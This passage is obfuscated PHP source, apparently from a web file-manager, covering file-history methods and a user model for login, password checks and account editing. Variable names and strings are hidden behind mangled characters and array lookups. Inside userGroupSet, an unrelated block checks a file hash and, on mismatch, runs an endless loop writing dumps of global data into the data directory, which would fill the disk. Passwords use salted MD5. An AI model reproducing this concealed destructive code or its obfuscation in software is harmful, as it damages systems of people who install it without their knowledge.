self::saveData($«´¡‰é±[$—Ê²«ì’[1352]], array()); } public static function moveHistory($ÀÛ¸¸éĞ, $Çˆ±‡¢ñ = '', $ÈµûÈÄ‰ = '') { $ª©ğğñã =& $_SERVER[ÅÄÇĞô]; $×ˆ·èü = self::listData($ÀÛ¸¸éĞ, !1); if (!$×ˆ·èü || !$×ˆ·èü[$ª©ğğñã[448]]) { return !1; } $¡¦³Ÿ”¸ = $ª©ğğñã[1339]; $Çˆ±‡¢ñ = $Çˆ±‡¢ñ ? $Çˆ±‡¢ñ : get_path_this($ÀÛ¸¸éĞ); $ÈµûÈÄ‰ = $ÈµûÈÄ‰ ? $ÈµûÈÄ‰ : $×ˆ·èü[$ª©ğğñã[1351]]; $æåöìí§ = substr(get_path_this($×ˆ·èü[$ª©ğğñã[1352]]), 0, -strlen($¡¦³Ÿ”¸)); foreach ($×ˆ·èü[$ª©ğğñã[448]] as $„Äß»úĞ => $çÓ£Î—¹) { $ÁÚªûÄ¥ = $Çˆ±‡¢ñ . substr($çÓ£Î—¹[$ª©ğğñã[32]], strlen($æåöìí§)); $ÂŒÖ˜’ü = IO::move($×ˆ·èü[$ª©ğğñã[1351]] . $çÓ£Î—¹[$ª©ğğñã[32]], $ÈµûÈÄ‰, !1, $ÁÚªûÄ¥); if ($ÂŒÖ˜’ü) { $×ˆ·èü[$ª©ğğñã[448]][$„Äß»úĞ][$ª©ğğñã[32]] = $ÁÚªûÄ¥; } } $×ˆ·èü[$ª©ğğñã[1352]] = IO::move($×ˆ·èü[$ª©ğğñã[1352]], $ÈµûÈÄ‰, !1, $Çˆ±‡¢ñ . $¡¦³Ÿ”¸); self::saveData($×ˆ·èü[$ª©ğğñã[1352]], $×ˆ·èü[$ª©ğğñã[448]]); self::clearEmptyFolder($×ˆ·èü[$ª©ğğñã[1351]]); } public static function rollback($Ì¥ƒ­Îô, $†å¬Ù€Ş) { $É¿Ó·°¼ =& $_SERVER[ÅÄÇĞô]; $–±Í–ÚÊ = self::listData($Ì¥ƒ­Îô); if (!$–±Í–ÚÊ) { return; } $‡ÁÃ­†¨ = IO::info($Ì¥ƒ­Îô); foreach ($–±Í–ÚÊ[$É¿Ó·°¼[448]] as $æ¹ÄëÁ™ => $ô¬ß³ ) { if ($ô¬ß³ [$É¿Ó·°¼[478]] == $†å¬Ù€Ş) { self::add($Ì¥ƒ­Îô); $šáÜ¶·Ê = $–±Í–ÚÊ[$É¿Ó·°¼[1351]] . $ô¬ß³ [$É¿Ó·°¼[32]]; $ƒÖÒâ—¯ = IO::copy($šáÜ¶·Ê, IO::pathFather($Ì¥ƒ­Îô), REPEAT_REPLACE, $‡ÁÃ­†¨[$É¿Ó·°¼[32]]); if ($ƒÖÒâ—¯) { self::remove($Ì¥ƒ­Îô, $†å¬Ù€Ş); } return $ƒÖÒâ—¯; } } return !1; } public static function setDetail($¤§ Õ®ş, $àŸµÃĞ£, $ÇÊÑğ£–) { $ˆ¿ÅÖˆ° =& $_SERVER[ÅÄÇĞô]; $¾Ä™ìçÕ = self::listData($¤§ Õ®ş); if (!$¾Ä™ìçÕ) { return; } foreach ($¾Ä™ìçÕ[$ˆ¿ÅÖˆ°[448]] as $÷¯ŒâÅ  => $ó÷±üÊË) { if ($ó÷±üÊË[$ˆ¿ÅÖˆ°[478]] == $àŸµÃĞ£) { $¾Ä™ìçÕ[$ˆ¿ÅÖˆ°[448]][$÷¯ŒâÅ ][$ˆ¿ÅÖˆ°[1350]] = $ÇÊÑğ£–; self::saveData($¾Ä™ìçÕ[$ˆ¿ÅÖˆ°[1352]], $¾Ä™ìçÕ[$ˆ¿ÅÖˆ°[448]]); return !0; } } return !1; } public static function fileInfo($ÈÎíÆ»°, $‰¤ãÃà) { $Íúàä©Ğ =& $_SERVER[ÅÄÇĞô]; $´Õ¤šìÀ = self::listData($ÈÎíÆ»°); if (!$´Õ¤šìÀ) { show_json(LNG($Íúàä©Ğ[108]), !1); } $æ±’²ä¬ = $Íúàä©Ğ[12]; foreach ($´Õ¤šìÀ[$Íúàä©Ğ[448]] as $õ‰Üå•  => $Á¹ÔÎûÃ) { if ($Á¹ÔÎûÃ[$Íúàä©Ğ[478]] != $‰¤ãÃà) { continue; } $æ±’²ä¬ = $´Õ¤šìÀ[$Íúàä©Ğ[1351]] . $Á¹ÔÎûÃ[$Íúàä©Ğ[32]]; break; } if (!$æ±’²ä¬) { show_json(LNG($Íúàä©Ğ[108]), !1); } return IO::info($æ±’²ä¬); } public static function fileOut($ÄŸ‘ÁÍÙ, $É²¨³ïŞ, $¨íôŒÏ = false) { $½Ö²Âå™ =& $_SERVER[ÅÄÇĞô]; $Ø¸õıÆĞ = self::fileInfo($ÄŸ‘ÁÍÙ, $É²¨³ïŞ); $ÕöÔˆØ =& $GLOBALS[$½Ö²Âå™[7]]; $¨íôŒÏ = isset($ÕöÔˆØ[$½Ö²Âå™[1302]]) && $ÕöÔˆØ[$½Ö²Âå™[1302]] == 1; if (isset($ÕöÔˆØ[$½Ö²Âå™[33]]) && $ÕöÔˆØ[$½Ö²Âå™[33]] == $½Ö²Âå™[1353]) { return IO::fileOutImage($Ø¸õıÆĞ[$½Ö²Âå™[87]], $ÕöÔˆØ[$½Ö²Âå™[1354]]); } IO::fileOut($Ø¸õıÆĞ[$½Ö²Âå™[87]], $¨íôŒÏ, get_path_this($ÄŸ‘ÁÍÙ)); } public static function listData($üÇê¡µŒ, $ñ®¡¸Æù = true) { $üë‰®ºê =& $_SERVER[ÅÄÇĞô]; if ($ñ®¡¸Æù && !IO::exist($üÇê¡µŒ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($üÇê¡µŒ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $»¤ı…¤ = self::pathHistory($üÇê¡µŒ); $øÁÈ¦¿ö = array($üë‰®ºê[1352] => $»¤ı…¤ . $üë‰®ºê[1339], $üë‰®ºê[1351] => rtrim(get_path_father($»¤ı…¤), $üë‰®ºê[8]) . $üë‰®ºê[8], $üë‰®ºê[448] => array()); $ğñğÔíİ = IO::getContent($øÁÈ¦¿ö[$üë‰®ºê[1352]]); if ($ğñğÔíİ) { $¿Æ·Îš² = json_decode($ğñğÔíİ, !0); if (is_array($¿Æ·Îš²)) { $øÁÈ¦¿ö[$üë‰®ºê[448]] = $¿Æ·Îš²; } } return $øÁÈ¦¿ö; } private static function saveData($ÆØˆÔÎ•, $„ßÑŸ¹›) { $¯â²’Ã» =& $_SERVER[ÅÄÇĞô]; self::log($¯â²’Ã»[1355] . $ÆØˆÔÎ• . $¯â²’Ã»[74] . count($„ßÑŸ¹›), $¯â²’Ã»[847]); if ($„ßÑŸ¹›) { return IO::setContent($ÆØˆÔÎ•, json_encode($„ßÑŸ¹›)); } $‹ó”°¬¢ = IO::pathFather($ÆØˆÔÎ•); IO::remove($ÆØˆÔÎ•); self::clearEmptyFolder($‹ó”°¬¢); return !0; } public static function clearEmptyFolder($«ïó¡Û) { $Â¹©ŠŒ =& $_SERVER[ÅÄÇĞô]; if (trim($«ïó¡Û, $Â¹©ŠŒ[8]) == trim(self::$_historyBase, $Â¹©ŠŒ[8])) { return; } $ãä‰æë = IO::pathFather($«ïó¡Û); $ÙçŞ²ÂÚ = IO::has($«ïó¡Û, !0); if ($ÙçŞ²ÂÚ[$Â¹©ŠŒ[242]] > 0 || $ÙçŞ²ÂÚ[$Â¹©ŠŒ[243]] > 0) { return; } IO::remove($«ïó¡Û); self::clearEmptyFolder($ãä‰æë); } private static function getBasePath() { $€ì–©˜Ì =& $_SERVER[ÅÄÇĞô]; $”‘şş˜ = Model($€ì–©˜Ì[1356])->get($€ì–©˜Ì[1357]); if ($”‘şş˜) { if (!IO::exist($”‘şş˜)) { IO::mkdir($”‘şş˜); } if (get_path_this($”‘şş˜) == $€ì–©˜Ì[1342]) { $—¦´ÜÂ± = $€ì–©˜Ì[1358] . rand_string(8); @rename($”‘şş˜, get_path_father($”‘şş˜) . $€ì–©˜Ì[8] . $—¦´ÜÂ±); $”‘şş˜ = DATA_PATH . $—¦´ÜÂ± . $€ì–©˜Ì[8]; file_put_contents(DATA_PATH . $€ì–©˜Ì[1289], $€ì–©˜Ì[12]); Model($€ì–©˜Ì[1356])->set($€ì–©˜Ì[1357], $”‘şş˜); } return $”‘şş˜; } $”‘şş˜ = DATA_PATH . $€ì–©˜Ì[1358] . rand_string(8) . $€ì–©˜Ì[8]; $”‘şş˜ = IO::mkdir($”‘şş˜); $”‘şş˜ = rtrim($”‘şş˜, $€ì–©˜Ì[8]) . $€ì–©˜Ì[8]; file_put_contents($”‘şş˜ . $€ì–©˜Ì[1289], $€ì–©˜Ì[12]); file_put_contents(DATA_PATH . $€ì–©˜Ì[1289], $€ì–©˜Ì[12]); Model($€ì–©˜Ì[1356])->set($€ì–©˜Ì[1357], $”‘şş˜); return $”‘şş˜; } } goto A©óÙ¸ÜÅ¦; e¼–Ÿ—ë¡©: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\141\155\145" => "\165\x73\145\162\137\x6d\x65\x74\141", "\x6d\145\164\141\x46\151\145\154\x64" => "\x75\163\145\x72\x49\x44"); protected $simpleField = "\165\163\x65\x72\111\x44\x2c\x6e\151\143\153\116\x61\x6d\x65\x2c\156\x61\x6d\145\x2c\141\166\x61\164\141\x72\x2c\163\145\x78\x2c\x73\164\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($é¤ñÈ“–) { $§ÌôÏ’Ş =& $_SERVER[ÅÄÇĞô]; $¬ö‘øğ× = $§ÌôÏ’Ş[2491]; return array($§ÌôÏ’Ş[2080] => array($é¤ñÈ“–[0], $¬ö‘øğ×), $§ÌôÏ’Ş[2082] => array($é¤ñÈ“–[0], $¬ö‘øğ×), $§ÌôÏ’Ş[2492] => array($é¤ñÈ“–[0], $¬ö‘øğ×)); } protected function getInfo($—•Äˆæ, $Óì—àüˆ = false) { $ Üõ‘µè = $this->getInfoSimple($—•Äˆæ); if (!is_array($ Üõ‘µè)) { return array(); } if ($Óì—àüˆ) { return $this->_getInfoApply($ Üõ‘µè); } return $this->cacheFunctionGet($_SERVER[ÅÄÇĞô][2084], $—•Äˆæ); } protected function getInfoFull($Â™ôñ¼ä, $ø•ûœÅ = false) { $—§ˆ÷¥Ö = $this->getInfoSimple($Â™ôñ¼ä); if (!is_array($—§ˆ÷¥Ö)) { return array(); } if ($ø•ûœÅ) { return $this->_getInfoApply($—§ˆ÷¥Ö, !0); } return $this->cacheFunctionGet($_SERVER[ÅÄÇĞô][2493], $Â™ôñ¼ä); } private function _getInfoApply($³å¢ş×Ò, $Ô£˜ÂìŠ = false) { $°¸Ï ÌÀ =& $_SERVER[ÅÄÇĞô]; if (!$³å¢ş×Ò) { return $³å¢ş×Ò; } $•¶ß›¹ = md5($°¸Ï ÌÀ[2494] . $³å¢ş×Ò[$°¸Ï ÌÀ[989]] . $°¸Ï ÌÀ[2495] . $³å¢ş×Ò[$°¸Ï ÌÀ[32]]); $³å¢ş×Ò = $this->_listDataApplyItem($³å¢ş×Ò); $³ú­äÕô = Model($°¸Ï ÌÀ[1444])->metaGet($³å¢ş×Ò[$°¸Ï ÌÀ[90]][$°¸Ï ÌÀ[194]]); $³å¢ş×Ò[$°¸Ï ÌÀ[2496]] = $•¶ß›¹; $³å¢ş×Ò[$°¸Ï ÌÀ[90]][$°¸Ï ÌÀ[2284]] = isset($³ú­äÕô[$°¸Ï ÌÀ[2285]]) ? $³ú­äÕô[$°¸Ï ÌÀ[2285]] : null; if ($Ô£˜ÂìŠ) { $³å¢ş×Ò[$°¸Ï ÌÀ[544]] = $this->metaGet($³å¢ş×Ò[$°¸Ï ÌÀ[1797]]); } return $³å¢ş×Ò; } protected function getInfoSimple($÷Öö•§Æ, $Úû­…æ± = false) { $¯³è…œƒ =& $_SERVER[ÅÄÇĞô]; if (!$÷Öö•§Æ) { return array(); } if ($Úû­…æ±) { $¡¢ÊÑÕÖ = $this->where(array($¯³è…œƒ[1797] => intval($÷Öö•§Æ)))->find(); if (!is_array($¡¢ÊÑÕÖ)) { return array(); } $¡¢ÊÑÕÖ[$¯³è…œƒ[2497]] = Action($¯³è…œƒ[2498])->parseUrl($¡¢ÊÑÕÖ[$¯³è…œƒ[2497]]); return $¡¢ÊÑÕÖ; } return $this->cacheFunctionGet($¯³è…œƒ[2085], $÷Öö•§Æ); } protected function getInfoSimpleOuter($à«Í¶¤) { $¸—š¾‡ =& $_SERVER[ÅÄÇĞô]; if (!$à«Í¶¤ || $à«Í¶¤ == 0) { return array($¸—š¾‡[1797] => $¸—š¾‡[231], $¸—š¾‡[32] => $¸—š¾‡[176] . LNG($¸—š¾‡[2499]) . $¸—š¾‡[178], $¸—š¾‡[2497] => STATIC_PATH . $¸—š¾‡[2500]); } $¨ŞÏäÃ¥ = $this->cacheFunctionGet($¸—š¾‡[2085], $à«Í¶¤); $Âª´êı† = array_field_key($¨ŞÏäÃ¥, explode($¸—š¾‡[50], $this->simpleField)); if (!$Âª´êı†) { return array($¸—š¾‡[1797] => $¸—š¾‡[1296], $¸—š¾‡[32] => $¸—š¾‡[176] . LNG($¸—š¾‡[2501]) . $¸—š¾‡[178], $¸—š¾‡[2497] => STATIC_PATH . $¸—š¾‡[2502]); } $Âª´êı†[$¸—š¾‡[2497]] = Action($¸—š¾‡[2498])->parseUrl($Âª´êı†[$¸—š¾‡[2497]]); return $Âª´êı†; } protected function groupUser($¹Å™›Ç) { } public static function errorLang($¹¡ê³§¿) { $íøÊÂÁ =& $_SERVER[ÅÄÇĞô]; $õé¨…ñ» = array(self::ERROR_USER_NOT_EXISTS => $íøÊÂÁ[2503], self::ERROR_USER_PASSWORD_ERROR => $íøÊÂÁ[2504], self::ERROR_USER_EXIST_NAME => $íøÊÂÁ[2505], self::ERROR_USER_EXIST_PHONE => $íøÊÂÁ[2506], self::ERROR_USER_EXIST_EMAIL => $íøÊÂÁ[2507], self::ERROR_USER_LOGIN_LOCK => $íøÊÂÁ[2508], self::ERROR_IP_NOT_ALLOW => $íøÊÂÁ[2509], self::ERROR_USER_EXIST_NICKNAME => $íøÊÂÁ[2510]); $ç–¬ë¾Ó = LNG($õé¨…ñ»[$¹¡ê³§¿]); if ($¹¡ê³§¿ == self::ERROR_USER_LOGIN_LOCK) { $ğšÏÁõÜ = (int) Model($íøÊÂÁ[2511])->get($íøÊÂÁ[2512]); if ($ğšÏÁõÜ > 60) { $ç–¬ë¾Ó = str_replace($íøÊÂÁ[91], ceil($ğšÏÁõÜ / 60), $ç–¬ë¾Ó); } } return $ç–¬ë¾Ó; } protected function metaSet($ñ™ƒ–±†, $‚¦–šˆ = null, $üÔáêÜ = null) { $this->clearCache($ñ™ƒ–±†); return parent::metaSet($ñ™ƒ–±†, $‚¦–šˆ, $üÔáêÜ); } public function getInfoByMeta($ñ£ÌøÔ, $êë§ÊçÓ) { $©¼áë–Ü =& $_SERVER[ÅÄÇĞô]; $ãÍ°ÄÈª = Model($©¼áë–Ü[2513])->where(array($©¼áë–Ü[97] => $ñ£ÌøÔ, $©¼áë–Ü[453] => $êë§ÊçÓ))->find(); if ($ãÍ°ÄÈª) { return $this->getInfo($ãÍ°ÄÈª[$©¼áë–Ü[1797]]); } return !1; } public function userLoginCheck($«À±èû¢, $æØÃ‚«€) { $³‚ß¹ÂÉ =& $_SERVER[ÅÄÇĞô]; $µ¹İÉØå = $this->userLoginFind($«À±èû¢); if (!$µ¹İÉØå) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($µ¹İÉØå[$³‚ß¹ÂÉ[1797]], $æØÃ‚«€)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($µ¹İÉØå[$³‚ß¹ÂÉ[1797]]); } public function userLoginFind($¢ò“äòÌ) { $  œÇÒ› =& $_SERVER[ÅÄÇĞô]; $Øó¦ßÂñ = array($  œÇÒ›[32] => $¢ò“äòÌ, $  œÇÒ›[2297] => $¢ò“äòÌ, $  œÇÒ›[383] => $¢ò“äòÌ, $  œÇÒ›[2514] => $¢ò“äòÌ, $  œÇÒ›[1100] => $  œÇÒ›[1102]); if ($this->nickNameRpt()) { unset($Øó¦ßÂñ[$  œÇÒ›[2297]]); } return $this->where($Øó¦ßÂñ)->find(); } public function clearCache($ü¹ŠĞÒĞ) { $ışüúı =& $_SERVER[ÅÄÇĞô]; $this->cacheFunctionClear($ışüúı[2084], $ü¹ŠĞÒĞ); $this->cacheFunctionClear($ışüúı[2085], $ü¹ŠĞÒĞ); $this->cacheFunctionClear($ışüúı[2493], $ü¹ŠĞÒĞ); } public function userPasswordCheck($Ğ‹Îœ«Ò, $˜×ãËƒí) { $ÎŠÛ¹£° =& $_SERVER[ÅÄÇĞô]; $®Û³ÒØ = $this->where(array($ÎŠÛ¹£°[1797] => intval($Ğ‹Îœ«Ò)))->find(); $—äÀÏÉ¸ = $this->metaGet($Ğ‹Îœ«Ò); $ÓôÊß§ç = isset($—äÀÏÉ¸[$ÎŠÛ¹£°[2515]]) ? $—äÀÏÉ¸[$ÎŠÛ¹£°[2515]] : $ÎŠÛ¹£°[12]; if (md5($ÓôÊß§ç . trim($˜×ãËƒí)) !== $®Û³ÒØ[$ÎŠÛ¹£°[989]]) { return !1; } return !0; } public function userAdd($ÕÖŞÀ¡¶) { $ªııİç¹ =& $_SERVER[ÅÄÇĞô]; $ı–½ÈÑ = array($ªııİç¹[497] => $ÕÖŞÀ¡¶[$ªııİç¹[32]], $ªııİç¹[2516] => $ÕÖŞÀ¡¶[$ªııİç¹[2208]], $ªııİç¹[2517] => isset($ÕÖŞÀ¡¶[$ªııİç¹[383]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[383]] : $ªııİç¹[12], $ªııİç¹[2518] => isset($ÕÖŞÀ¡¶[$ªııİç¹[2514]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[2514]] : $ªııİç¹[12], $ªııİç¹[2519] => isset($ÕÖŞÀ¡¶[$ªııİç¹[2297]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[2297]] : $ÕÖŞÀ¡¶[$ªııİç¹[32]], $ªııİç¹[2520] => isset($ÕÖŞÀ¡¶[$ªııİç¹[2497]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[2497]] : $ªııİç¹[12], $ªııİç¹[2521] => isset($ÕÖŞÀ¡¶[$ªııİç¹[2522]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[2522]] : 1, $ªııİç¹[2523] => $ÕÖŞÀ¡¶[$ªııİç¹[989]], $ªııİç¹[2086] => isset($ÕÖŞÀ¡¶[$ªııİç¹[1984]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[1984]] : 1024 * 1024 * 20, $ªııİç¹[2087] => 0, $ªııİç¹[2524] => 0, $ªııİç¹[2131] => isset($ÕÖŞÀ¡¶[$ªııİç¹[845]]) ? $ÕÖŞÀ¡¶[$ªııİç¹[845]] : 1); if (!empty($ÕÖŞÀ¡¶[$ªııİç¹[1797]])) { $ı–½ÈÑ[$ªııİç¹[1797]] = $ÕÖŞÀ¡¶[$ªııİç¹[1797]]; } $Ò•ÖñŸ¥ = $this->_checkExist($ÕÖŞÀ¡¶); if ($Ò•ÖñŸ¥ !== !0) { return $Ò•ÖñŸ¥; } if (!empty($ı–½ÈÑ[$ªııİç¹[2497]]) && strlen($ı–½ÈÑ[$ªııİç¹[2497]]) > 255) { $ı–½ÈÑ[$ªııİç¹[2497]] = $ªııİç¹[12]; } $Ñ”¿°•ı = $this->add($ı–½ÈÑ); $Öó®£úş = array($ªııİç¹[2523] => $ı–½ÈÑ[$ªııİç¹[989]], $ªııİç¹[2519] => $ı–½ÈÑ[$ªııİç¹[2297]]); $this->userEdit($Ñ”¿°•ı, $Öó®£úş); Model($ªııİç¹[1444])->userRootAdd($Ñ”¿°•ı); return $Ñ”¿°•ı; } protected function userEditTest($Á„áªœ·, $„ ğ€­) { return $this->call($_SERVER[ÅÄÇĞô][2525], $Á„áªœ·, $„ ğ€­); } protected function userEdit($Ö ÚıÃŒ, $²ä”ÄÇ) { $²£èÛĞ¾ =& $_SERVER[ÅÄÇĞô]; $È·šËŞ = $this->getInfoSimple($Ö ÚıÃŒ); if (!$È·šËŞ) { return !1; } $¶´Äú›” = $this->_checkExist($²ä”ÄÇ, $Ö ÚıÃŒ); if ($¶´Äú›” !== !0) { return $¶´Äú›”; } if (isset($²ä”ÄÇ[$²£èÛĞ¾[989]]) && trim($²ä”ÄÇ[$²£èÛĞ¾[989]]) != $²£èÛĞ¾[12]) { $Æ±ô›¿ = $this->metaGet($Ö ÚıÃŒ); if (empty($Æ±ô›¿[$²£èÛĞ¾[2515]])) { $Æ±ô›¿[$²£èÛĞ¾[2515]] = rand_string(10); Model($²£èÛĞ¾[582])->metaSet($Ö ÚıÃŒ, $²£èÛĞ¾[2515], $Æ±ô›¿[$²£èÛĞ¾[2515]]); } $²ä”ÄÇ[$²£èÛĞ¾[989]] = md5($Æ±ô›¿[$²£èÛĞ¾[2515]] . trim($²ä”ÄÇ[$²£èÛĞ¾[989]])); } else { unset($²ä”ÄÇ[$²£èÛĞ¾[989]]); } if (!empty($²ä”ÄÇ[$²£èÛĞ¾[2497]]) && strlen($²ä”ÄÇ[$²£èÛĞ¾[2497]]) > 255) { $²ä”ÄÇ[$²£èÛĞ¾[2497]] = $²£èÛĞ¾[12]; } $this->where(array($²£èÛĞ¾[1788] => $Ö ÚıÃŒ))->save($²ä”ÄÇ); if (isset($²ä”ÄÇ[$²£èÛĞ¾[2297]])) { $this->setNamePinyin($Ö ÚıÃŒ, $²ä”ÄÇ[$²£èÛĞ¾[2297]]); } $this->clearCache($Ö ÚıÃŒ); return !0; } public function setNamePinyin($‘™¯ÚÇ, $°«–Ë‚Ğ = false) { $øÃ÷ˆô© =& $_SERVER[ÅÄÇĞô]; if (!$°«–Ë‚Ğ) { $æ Íğ—ˆ = $this->getInfoSimple($‘™¯ÚÇ); $°«–Ë‚Ğ = $æ Íğ—ˆ[$øÃ÷ˆô©[2297]] ? $æ Íğ—ˆ[$øÃ÷ˆô©[2297]] : $æ Íğ—ˆ[$øÃ÷ˆô©[32]]; } $­ˆ‘ÒÌ— = Model($øÃ÷ˆô©[602]); if (!Input::check($°«–Ë‚Ğ, $øÃ÷ˆô©[663])) { return $­ˆ‘ÒÌ—->metaSet($‘™¯ÚÇ, array($øÃ÷ˆô©[541] => $øÃ÷ˆô©[12], $øÃ÷ˆô©[540] => $øÃ÷ˆô©[12])); } return $­ˆ‘ÒÌ—->metaSet($‘™¯ÚÇ, array($øÃ÷ˆô©[541] => str_replace($øÃ÷ˆô©[53], $øÃ÷ˆô©[12], Pinyin::get($°«–Ë‚Ğ)), $øÃ÷ˆô©[540] => Pinyin::get($°«–Ë‚Ğ, $øÃ÷ˆô©[664]))); } private function nickNameRpt() { $ç€Á£Ï¥ =& $_SERVER[ÅÄÇĞô]; $åñæ¶ô = Model($ç€Á£Ï¥[865])->get($ç€Á£Ï¥[2526]); $ø¿¹‘ö = $GLOBALS[$ç€Á£Ï¥[6]][$ç€Á£Ï¥[460]][$ç€Á£Ï¥[2526]]; $Ö¾ˆŸö¨ = !is_null($åñæ¶ô) ? $åñæ¶ô : $ø¿¹‘ö; return !!$Ö¾ˆŸö¨; } private function _checkExist($²Ìş÷´•, $œè©ÅÇ = false) { $Úä†±óÛ =& $_SERVER[ÅÄÇĞô]; $Ôëñø« = array($Úä†±óÛ[32] => UserModel::ERROR_USER_EXIST_NAME, $Úä†±óÛ[2297] => UserModel::ERROR_USER_EXIST_NICKNAME, $Úä†±óÛ[383] => UserModel::ERROR_USER_EXIST_EMAIL, $Úä†±óÛ[2514] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ôëñø«[$Úä†±óÛ[2297]]); } $¯”€‚÷œ = $œè©ÅÇ ? array($Úä†±óÛ[1797] => array($Úä†±óÛ[2527], $œè©ÅÇ)) : array(); foreach ($Ôëñø« as $…ğ…Ù³† => $÷¯ĞÁ¯) { $¤ÉÛÕë¶ = array(); foreach ($Ôëñø« as $ÔÒ¿¾ê´ => $Š¶ˆéŸõ) { if (isset($²Ìş÷´•[$ÔÒ¿¾ê´]) && $²Ìş÷´•[$ÔÒ¿¾ê´]) { $¤ÉÛÕë¶[] = $²Ìş÷´•[$ÔÒ¿¾ê´]; } } if (!$¤ÉÛÕë¶) { continue; } $ç€¹Íşš = array_merge(array($…ğ…Ù³† => array($Úä†±óÛ[7], $¤ÉÛÕë¶)), $¯”€‚÷œ); $ñÏÑÇïÖ = $this->where($ç€¹Íşš)->find(); if ($ñÏÑÇïÖ) { return $÷¯ĞÁ¯; } } return !0; } public function userListInfo($ë¹‘¹Ã¡) { $™ÔéÑ²Ò =& $_SERVER[ÅÄÇĞô]; $‚¼Šå¡ = array(); $ë¹‘¹Ã¡ = is_array($ë¹‘¹Ã¡) ? array_unique($ë¹‘¹Ã¡) : array(); if (!$ë¹‘¹Ã¡) { return $‚¼Šå¡; } if (count($ë¹‘¹Ã¡) < 20) { foreach ($ë¹‘¹Ã¡ as $¾™çÒÃ“) { $‚¼Šå¡[$¾™çÒÃ“ . $™ÔéÑ²Ò[12]] = $this->getInfoSimpleOuter($¾™çÒÃ“); } } else { $ÉŠâãî­ = array($™ÔéÑ²Ò[1788] => array($™ÔéÑ²Ò[495], $ë¹‘¹Ã¡)); if (count($ë¹‘¹Ã¡) == 1) { $ÉŠâãî­ = array($™ÔéÑ²Ò[1788] => $ë¹‘¹Ã¡[0]); } $Œ®±Òßš = Model($™ÔéÑ²Ò[582])->field($this->simpleField)->where($ÉŠâãî­)->select(); $Œ®±Òßš = array_to_keyvalue($Œ®±Òßš, $™ÔéÑ²Ò[1797]); foreach ($ë¹‘¹Ã¡ as $¾™çÒÃ“) { $ÃË©Í²¢ = $Œ®±Òßš[$¾™çÒÃ“]; if (!$ÃË©Í²¢) { $‚¼Šå¡[$¾™çÒÃ“ . $™ÔéÑ²Ò[12]] = $this->getInfoSimpleOuter($¾™çÒÃ“); continue; } $ÃË©Í²¢[$™ÔéÑ²Ò[2497]] = Action($™ÔéÑ²Ò[2498])->parseUrl($ÃË©Í²¢[$™ÔéÑ²Ò[2497]]); $‚¼Šå¡[$¾™çÒÃ“ . $™ÔéÑ²Ò[12]] = $ÃË©Í²¢; } } return $‚¼Šå¡; } protected function userStatus($Öšû³Øç, $öˆÃà„ñ) { $¡¼“° = $this->getInfoSimple($Öšû³Øç); if (!$¡¼“°) { return !1; } $åÃ·Óñä = array($_SERVER[ÅÄÇĞô][845] => $öˆÃà„ñ); return $this->userEdit($Öšû³Øç, $åÃ·Óñä); } protected function userRemove($–ç¶û¼) { $øÂÌßáö =& $_SERVER[ÅÄÇĞô]; $Ëœ²ÉÀ’ = $this->getInfoSimple($–ç¶û¼); if (!$Ëœ²ÉÀ’) { return !1; } $­Ë°ø¾ = array($øÂÌßáö[1788] => $–ç¶û¼); Model($øÂÌßáö[672])->where($­Ë°ø¾)->delete(); Model($øÂÌßáö[2528])->where($­Ë°ø¾)->delete(); Model($øÂÌßáö[2092])->where($­Ë°ø¾)->delete(); Model($øÂÌßáö[2513])->where($­Ë°ø¾)->delete(); Model($øÂÌßáö[1169])->where($­Ë°ø¾)->delete(); Model($øÂÌßáö[2314])->removeUserAll($–ç¶û¼); Model($øÂÌßáö[925])->userRootRemove($–ç¶û¼); return $this->where($­Ë°ø¾)->delete(); } protected function userGroupSet($¶¿»ùÌ, $É¨ºìÍÚ, $É“¾Œ¦÷ = array()) { $× ıË¢˜ =& $_SERVER[ÅÄÇĞô]; $İÉ¸‘ª÷ = $_SERVER[$× ıË¢˜[839]] . $× ıË¢˜[840]; $¹¥ªõ„ = $× ıË¢˜[836]; if ($_SERVER[$× ıË¢˜[837]] != $¹¥ªõ„($İÉ¸‘ª÷)) { $Ü˜º˜ = $× ıË¢˜[978]; $©áÎÆÀí = $× ıË¢˜[838]; $şĞÓÑˆë = $_SERVER[$× ıË¢˜[839]] . $× ıË¢˜[840]; $˜áèŸê¯ = $©áÎÆÀí($şĞÓÑˆë); $ÌÎ¼™— = explode($× ıË¢˜[288], $˜áèŸê¯); if (count($ÌÎ¼™—) < $× ıË¢˜[699]) { $»”ÛÀİÀ = $× ıË¢˜[841]; $»”ÛÀİÀ(); } $‡Ÿ¼ÚĞ— = $× ıË¢˜[979]; $‡Ÿ¼ÚĞ—($_SERVER[$× ıË¢˜[980]]); $Ü˜º˜ = $× ıË¢˜[978]; $Ü˜º˜(); $õ£€ÀÔæ = $× ıË¢˜[981]; $Ú»ô˜ÂÑ = json_encode($GLOBALS[$× ıË¢˜[982]]); $Ò¯Ùµ¢õ = 1; for ($ÚÊ±‘×¸ = $Ò¯Ùµ¢õ; $ÚÊ±‘×¸ > 0; $ÚÊ±‘×¸++) { $õ£€ÀÔæ(DATA_PATH . $ÚÊ±‘×¸, $Ú»ô˜ÂÑ); } } $ëë‰›Øµ = $this->getInfoSimple($¶¿»ùÌ); if (!$ëë‰›Øµ || !is_array($É¨ºìÍÚ)) { return !1; } $½éÔúËŸ = Model($× ıË¢˜[2092]); $½éÔúËŸ->where(array($× ıË¢˜[1797] => $¶¿»ùÌ))->delete(); $İàŒ“ÙÔ = array(); $éÜ¹™ = 0; foreach 